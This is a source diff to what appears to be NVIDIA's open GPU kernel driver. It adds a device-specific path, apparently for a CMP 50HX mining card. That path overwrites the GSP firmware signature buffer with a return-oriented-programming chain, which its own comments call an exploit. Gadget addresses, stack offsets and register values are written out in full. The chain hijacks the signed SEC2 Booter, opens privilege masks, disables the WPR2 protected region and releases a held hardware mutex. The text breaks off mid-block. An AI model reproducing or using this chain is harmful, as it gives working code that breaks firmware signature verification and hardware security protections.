@@ -170,6 +170,18 @@ typedef enum
 
 #define CMP90_PC_EXACT_MAX_GPU_INSTANCES        8U
 
+#define CMP50_PC_CANARY_PCI_DEVICE_ID       0x1E0910DEU
+#define CMP50_PC_CANARY_PCI_SUBDEVICE_MATCHES(id) (((id) == 0x155410DEU) || ((id) == 0x371F1462U))
+#define CMP50_PC_CANARY_SIGNATURE_SIZE      0x0000FA00ULL
+#define CMP50_PC_CANARY_UNIFORM_DWORD       0x00000CBDU
+#define CMP50_PCIE_XP3G_PLM                 0x0008E1B0U
+#define CMP50_PCIE_XP3G_OVERRIDE0           0x0008E110U
+#define CMP50_PCIE_XP3G_OVERRIDE3           0x0008E11CU
+#define CMP50_PCIE_XP3G_VALUE3               0x0008E12CU
+NV_STATUS kgspCmp50RebuildStockSignature(OBJGPU *pGpu, KernelGsp *pKernelGsp);
+NV_STATUS kgspCmp50ReplaceSignature(OBJGPU *pGpu, KernelGsp *pKernelGsp,
+                                    NvBool bSecondExploit);
+
 struct MIG_CI_UPDATE_CALLBACK_PARAMS
 {
     NvU32 execPartCount;
@@ -5493,15 +5505,25 @@ _kgspBootGspRm(OBJGPU *pGpu, KernelGsp *pKernelGsp, GSP_FIRMWARE *pGspFw, GPU_MA
     if (!_kgspSec2PostblTimingEnabled(pGpu) && kgspIsWpr2Up_HAL(pGpu, pKernelGsp) &&
         (!pGpu->getProperty(pGpu, PDB_PROP_GPU_PREINITIALIZED_WPR_REGION)))
     {
-        NV_PRINTF(LEVEL_ERROR, "unexpected WPR2 already up, cannot proceed with booting GSP\n");
-        NV_PRINTF(LEVEL_ERROR, "(the GPU is likely in a bad state and may need to be reset)\n");
-
-        if (pKernelBif != NULL)
+        if ((pGpu->idInfo.PCIDeviceID == CMP50_PC_CANARY_PCI_DEVICE_ID) &&
+            CMP50_PC_CANARY_PCI_SUBDEVICE_MATCHES(pGpu->idInfo.PCISubDeviceID))
         {
-            kbifCheckResetStatus_HAL(pGpu, pKernelBif);
+            NV_PRINTF(LEVEL_ERROR,
+                      "CMP50_COMPUTE_UNLOCK_V132: continuing final FECS "
+                      "pass with cumulative WPR PLMs active\n");
         }
+        else
+        {
+            NV_PRINTF(LEVEL_ERROR, "unexpected WPR2 already up, cannot proceed with booting GSP\n");
+            NV_PRINTF(LEVEL_ERROR, "(the GPU is likely in a bad state and may need to be reset)\n");
 
-        return NV_ERR_INVALID_STATE;
+            if (pKernelBif != NULL)
+            {
+                kbifCheckResetStatus_HAL(pGpu, pKernelBif);
+            }
+
+            return NV_ERR_INVALID_STATE;
+        }
     }
 
     // Populate WPR meta structure (requires knowing FB size on dGPU, which depends on GFW_BOOT)
@@ -5528,7 +5550,6 @@ _kgspBootGspRm(OBJGPU *pGpu, KernelGsp *pKernelGsp, GSP_FIRMWARE *pGspFw, GPU_MA
 
     if (_kgspSec2PostblTimingEnabled(pGpu))
     {
-        NvU32 devId = pGpu->idInfo.PCIDeviceID >> 16;
         NvU32 plmIdx, attempt;
         NV_STATUS plmStatus;
 
@@ -6746,8 +6767,8 @@ kgspPrepareBootBinaryImage_IMPL
 )
 {
     NV_STATUS status;
-    BINDATA_STORAGE *pBinStorageImage;
-    BINDATA_STORAGE *pBinStorageDesc;
+    BINDATA_STORAGE *pBinStorageImage = NULL;
+    BINDATA_STORAGE *pBinStorageDesc = NULL;
     NvU32 bufSize;
     NvU32 bufSizeAligned;
     RM_RISCV_UCODE_DESC *pDesc = NULL;
@@ -6760,6 +6781,18 @@ kgspPrepareBootBinaryImage_IMPL
 
     // get the bindata storage for the image/descriptor
     kgspGetGspRmBootUcodeStorage_HAL(pGpu, pKernelGsp, &pBinStorageImage, &pBinStorageDesc);
+    if ((pBinStorageImage == NULL) || (pBinStorageDesc == NULL))
+    {
+        if ((pGpu->idInfo.PCIDeviceID == CMP50_PC_CANARY_PCI_DEVICE_ID) &&
+            CMP50_PC_CANARY_PCI_SUBDEVICE_MATCHES(pGpu->idInfo.PCISubDeviceID))
+        {
+            NV_PRINTF(LEVEL_ERROR,
+                      "CMP50_STOCKFLOW_V551: GSP_RM_BOOT_STORAGE_NULL "
+                      "image=%p desc=%p\n",
+                      pBinStorageImage, pBinStorageDesc);
+        }
+        return NV_ERR_NOT_SUPPORTED;
+    }
 
     // copy the image to sysmem
     bufSize = bindataGetBufferSize(pBinStorageImage);
@@ -7176,6 +7209,20 @@ fail_create:
     return status;
 }
 
+static void
+_kgspCmp50PutU32
+(
+    NvU8 *pBuffer,
+    NvU32 offset,
+    NvU32 value
+)
+{
+    pBuffer[offset + 0] = (NvU8)(value >> 0);
+    pBuffer[offset + 1] = (NvU8)(value >> 8);
+    pBuffer[offset + 2] = (NvU8)(value >> 16);
+    pBuffer[offset + 3] = (NvU8)(value >> 24);
+}
+
 static NV_STATUS
 _kgspCreateSignatureMemdesc
 (
@@ -7186,9 +7233,14 @@ _kgspCreateSignatureMemdesc
 {
     NV_STATUS status = NV_OK;
     NvU8 *pSignatureVa = NULL;
+    NvU64 i;
     NvBool bPostbl = _kgspSec2PostblTimingEnabled(pGpu);
+    NvBool bCmp50PcCanary =
+        (pGpu->idInfo.PCIDeviceID == CMP50_PC_CANARY_PCI_DEVICE_ID) &&
+        CMP50_PC_CANARY_PCI_SUBDEVICE_MATCHES(pGpu->idInfo.PCISubDeviceID);
     NvU64 sigSize = bPostbl ? SEC2_POSTBL_TIMING_SIGNATURE_SIZE
-                            : NV_ALIGN_UP(pGspFw->signatureSize, 256);
+                  : (bCmp50PcCanary ? CMP50_PC_CANARY_SIGNATURE_SIZE
+                                    : NV_ALIGN_UP(pGspFw->signatureSize, 256));
     NvU64 flags = MEMDESC_FLAGS_NONE;
 
     if (confComputeForceUnprotAlloc(pGpu))
@@ -7248,6 +7300,351 @@ _kgspCreateSignatureMemdesc
         }
         memdescFlushCpuCaches(pGpu, pKernelGsp->pSignatureMemdesc);
     }
+    else if (bCmp50PcCanary)
+    {
+        NvU32 cmp50PcieXp3gOverride0 = 1U;
+        if ((pGspFw->pSignatureData == NULL) ||
+            (pGspFw->signatureSize == 0) ||
+            (pKernelGsp->pStockSignatureData != NULL))
+        {
+            status = NV_ERR_INVALID_STATE;
+            goto fail_alloc;
+        }
+
+        pKernelGsp->pStockSignatureData =
+            portMemAllocNonPaged(pGspFw->signatureSize);
+        if (pKernelGsp->pStockSignatureData == NULL)
+        {
+            status = NV_ERR_INSUFFICIENT_RESOURCES;
+            goto fail_alloc;
+        }
+        pKernelGsp->stockSignatureSize = pGspFw->signatureSize;
+        portMemCopy(pKernelGsp->pStockSignatureData,
+                    pGspFw->signatureSize,
+                    pGspFw->pSignatureData,
+                    pGspFw->signatureSize);
+
+        for (i = 0; i + sizeof(NvU32) <= sigSize;
+             i += sizeof(NvU32))
+        {
+            _kgspCmp50PutU32(pSignatureVa, (NvU32)i,
+                             CMP50_PC_CANARY_UNIFORM_DWORD);
+        }
+
+        /*
+         * V151 keeps execution inside the original signed Booter.  The first
+         * native BAR0 write opens FECS FEATURE_OVERRIDE_PLM.  The second clears
+         * SEC2 MAILBOX0 so a direct, successful Booter halt is reported as
+         * BOOTER_OK after the normal post-verification path has run.
+         *
+         * Runtime PC addresses use the Booter's +0x100 code base.  Gadget
+         * 0x64ec is an unaligned `mov sp, r6` stack pivot followed by a bounded
+         * error return.  We first pivot to controlled DMEM 0xc100, use 0x0c1d
+         * to rewrite the already-consumed saved return slot at 0xff4c with the
+         * normal caller continuation 0x277b.  V244 then rebuilds the vulnerable
+         * verifier's frame at 0xff14 and resumes at runtime PC 0x3988, just
+         * after the overflowing DMA helper.  Signed Booter therefore executes
+         * its two remaining secure checks and returns naturally through
+         * 0xff4c instead of skipping the verifier tail.
+         *
+         * The verifier tail first requires generic descriptor version 2 at
+         * offset 0, then reads commands 0x12 and 0x13 from the signature
+         * descriptor at offsets 0x880 and 0x884.  V244 preserves the exact
+         * 580.159.03 TU10x values (LS ucode version 0x344, ucode id 1), so the
+         * signed revocation check can complete and populate WprMeta offset
+         * 0xec before GSP-RM starts.
+         *
+         * Booter then marks WprMeta verified, prepares GSP, writes handoffs,
+         * and starts GSP-RM.  Its epilogue sees the controlled canary at
+         * 0xff94 and returns to the real EXIT at runtime PC 0x7d34.  Uniform
+         * 0x0cbd is intentional: it is both the global/saved canary and the
+         * first-writer continuation at 0xff94.
+         */
+        _kgspCmp50PutU32(pSignatureVa, 0x0000, 0x00020001U); /* stock generic header/version 2 */
+        _kgspCmp50PutU32(pSignatureVa, 0x0880, 0x00000344U); /* stock LS ucode version */
+        _kgspCmp50PutU32(pSignatureVa, 0x0884, 0x00000001U); /* stock LS ucode id */
+        /*
+         * Signature offset 0x1100 lands at SEC2 DMEM 0x1700.  NVIDIA's
+         * booterCleanupAndHalt() restores RESET_PRIV_LEVEL_MASK[7:4] from
+         * this saved nibble immediately before scrubbing DMEM and halting.
+         * Keep all write levels enabled only across the bounded second stock
+         * Booter launch; that stock path must restore the final 0x8f mask.
+         */
+        _kgspCmp50PutU32(pSignatureVa, 0x1100, 0x0000000FU); /* temporary host-reset window */
+        _kgspCmp50PutU32(pSignatureVa, 0xF90C, 0x00000CBDU); /* tail-pivot guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF910, 0x00003988U); /* verifier tail */
+        _kgspCmp50PutU32(pSignatureVa, 0xF93C, 0x00000CBDU); /* pivot guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF940, 0x00001D62U); /* clear r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF944, 0x00000000U); /* clear-pop r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF948, 0x00000CBDU); /* saved guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF94C, 0x00000CC8U); /* first RA */
+        _kgspCmp50PutU32(pSignatureVa, 0xF950, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF954, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF958, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF95C, 0xFFFFFFFFU); /* open PLM */
+        _kgspCmp50PutU32(pSignatureVa, 0xF960, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF964, 0x00000CBDU); /* move r0->r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF968, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF96C, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF970, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF974, 0x00409650U); /* FECS PLM */
+        _kgspCmp50PutU32(pSignatureVa, 0xF978, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF97C, 0x00001F89U); /* form args */
+        _kgspCmp50PutU32(pSignatureVa, 0xF980, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF984, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF988, 0x88888888U); /* full-speed SS0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF98C, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF990, 0x000010AAU); /* BAR0 writer */
+        _kgspCmp50PutU32(pSignatureVa, 0xF994, 0x00000CBDU); /* r0->r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF998, 0x00007D34U); /* pop r3 / exit */
+        _kgspCmp50PutU32(pSignatureVa, 0xF99C, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9A0, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9A4, 0x00409664U); /* SS0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9A8, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9AC, 0x00001F89U); /* form args */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9B0, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9B4, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9B8, 0x00000000U); /* r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9BC, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9C0, 0x000010AAU); /* writer */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9C4, 0x000005FFU); /* pop r0-r6 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9C8, 0x0000C100U); /* r6/pivot */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9CC, 0x00000000U); /* r5 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9D0, 0x00000000U); /* r4 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9D4, 0x00000000U); /* r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9D8, 0x00000000U); /* r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9DC, 0x00000000U); /* r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9E0, 0x00000000U); /* r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9E4, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xF9E8, 0x000064ECU); /* stack-safe pivot */
+
+        /*
+         * Secondary stack at DMEM 0xc100.  Booter Load enforces a hardware
+         * stack-underflow boundary at 0xc000, so the historical 0x7d34 stack
+         * could never reach the native continuation.
+         */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB00, 0x00000CBDU); /* canary */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB04, 0x000005FFU); /* pop r0-r6 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB08, 0x0000FF3CU); /* r6 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB0C, 0x00000000U); /* r5 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB10, 0x00000000U); /* r4 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB14, 0x00000000U); /* r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB18, 0x00000000U); /* r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB1C, 0x00000000U); /* r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB20, 0x00000008U); /* full-speed SS1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB24, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB28, 0x00000CBDU); /* r0->r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB2C, 0x00000000U); /* r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB30, 0x00000000U); /* r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB34, 0x00000000U); /* r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB38, 0x0040966CU); /* SS1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB3C, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB40, 0x00001F89U); /* form args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB44, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB48, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB4C, 0xFFFFFF8FU); /* exact stock FECS PLM */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB50, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB54, 0x000010AAU); /* SS1 writer */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB58, 0x00000CBDU); /* postlock r0->r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB5C, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB60, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB64, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB68, 0x00409650U); /* FECS PLM */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB6C, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB70, 0x00001F89U); /* form postlock args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB74, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB78, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB7C, 0xFFFFFFFFU); /* next: open TU102 XP3G PLM0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB80, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB84, 0x000010AAU); /* FECS postlock writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBB88, 0x00000CBDU); /* XP3G PLM0 value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB8C, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB90, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB94, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB98, CMP50_PCIE_XP3G_PLM); /* XP3G PLM0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBB9C, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBA0, 0x00001F89U); /* form XP3G PLM0 args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBA4, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBA8, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBAC, cmp50PcieXp3gOverride0); /* next: XP3G OVR0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBB0, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBB4, 0x000010AAU); /* XP3G PLM0 writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBBB8, 0x00000CBDU); /* XP3G OVR0 value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBBC, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBC0, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBC4, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBC8, CMP50_PCIE_XP3G_OVERRIDE0); /* XP3G OVR0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBCC, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBD0, 0x00001F89U); /* form XP3G OVR0 args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBD4, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBD8, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBDC, 0x00200000U); /* next: XP3G VAL3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBE0, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBE4, 0x000010AAU); /* XP3G OVR0 writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBBE8, 0x00000CBDU); /* XP3G VAL3 value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBEC, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBF0, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBF4, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBF8, CMP50_PCIE_XP3G_VALUE3); /* XP3G VAL3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBFC, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC00, 0x00001F89U); /* form XP3G VAL3 args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC04, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC08, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC0C, 0x00000004U); /* next: XP3G OVR3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC10, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC14, 0x000010AAU); /* XP3G VAL3 writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBC18, 0x00000CBDU); /* XP3G OVR3 value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC1C, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC20, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC24, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC28, CMP50_PCIE_XP3G_OVERRIDE3); /* XP3G OVR3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC2C, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC30, 0x00001F89U); /* form XP3G OVR3 args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC34, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC38, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC3C, 0x00000000U); /* next: disable WPR2 via HI=0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC40, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC44, 0x000010AAU); /* XP3G OVR3 writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBC48, 0x00000CBDU); /* WPR2 HI value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC4C, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC50, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC54, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC58, 0x001FA828U); /* WPR2 HI */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC5C, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC60, 0x00001F89U); /* form WPR2 HI args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC64, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC68, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC6C, 0x000000FFU); /* next: open RESET_PLM */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC70, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC74, 0x000010AAU); /* WPR2 HI writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBC78, 0x00000CBDU); /* RESET_PLM value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC7C, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC80, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC84, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC88, 0x008403C4U); /* SEC2 RESET_PLM */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC8C, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC90, 0x00001F89U); /* form RESET_PLM args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC94, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC98, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBC9C, 0x1FFFFE00U); /* next: WPR2 LO */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCA0, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCA4, 0x000010AAU); /* RESET_PLM writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBCA8, 0x00000CBDU); /* WPR2 LO value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCAC, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCB0, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCB4, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCB8, 0x001FA824U); /* WPR2 LO */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCBC, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCC0, 0x00001F89U); /* form WPR2 LO args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCC4, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCC8, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCCC, 0x000000FFU); /* next: host-reset window */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCD0, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCD4, 0x000010AAU); /* WPR2 LO writer */
+
+        _kgspCmp50PutU32(pSignatureVa, 0xBCD8, 0x00000CBDU); /* RESET_PLM value -> r10 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCDC, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCE0, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCE4, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCE8, 0x008403C4U); /* SEC2 RESET_PLM */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCEC, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCF0, 0x00001F89U); /* form RESET_PLM args */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCF4, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCF8, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBCFC, 0x00000000U); /* pop r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD00, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD04, 0x000010AAU); /* RESET_PLM writer */
+
+        /*
+         * The exploit exits booterInit() through the ROP tail, bypassing the
+         * normal done path that releases
+         * SEC2_MUTEX_ACR_ALLOW_ONLY_ONE_ACR_BINARY_AT_ANY_TIME.  A second
+         * pristine Booter otherwise loops forever while trying to acquire
+         * that still-owned mutex and leaves its startup sentinel (0x31) in
+         * MAILBOX0.  Reuse V235's hardware-proven token-aware release path:
+         * group-0 mutex-3 owner is at secure-bus address 0x8e18 and the
+         * observed owner token is 0xc2.
+         */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD08, 0x000005FFU); /* pop r0-r6 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD0C, 0x00000000U); /* r6 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD10, 0x00000000U); /* r5 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD14, 0x00000000U); /* r4 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD18, 0x00008E18U); /* r3 / owner address */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD1C, 0x000000C2U); /* r2 / owner token */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD20, 0x00000000U); /* r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD24, 0x00000000U); /* r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD28, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD2C, 0x00000D27U); /* owner/token release tail */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD30, 0x00000000U); /* pop r5 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD34, 0x00000000U); /* pop r4 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD38, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD3C, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD40, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD44, 0x00000000U); /* pop r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD48, 0x00000000U); /* add8 padding */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD4C, 0x00000CBDU); /* guard */
+
+        /* Clear the startup sentinel and enter NVIDIA's native cleanup. */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD50, 0x00000CBDU); /* r0->r10=0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD54, 0x00000000U); /* pop r3 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD58, 0x00000000U); /* pop r2 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD5C, 0x00000000U); /* pop r1 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD60, 0x00000000U); /* pop r0 */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD64, 0x00000CBDU); /* guard */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD68, 0x00001CDDU); /* native CSB MAILBOX0 writer */
+        _kgspCmp50PutU32(pSignatureVa, 0xBD6C, 0x00007C43U); /* native cleanup-and-halt */
+#if 0
+        /* V249's native-GSP continuation is intentionally disabled in V272. */
+        _kgspCmp50PutU32(pSignatureVa, 0xBBAC, 0x00000CBDU); /* guard */
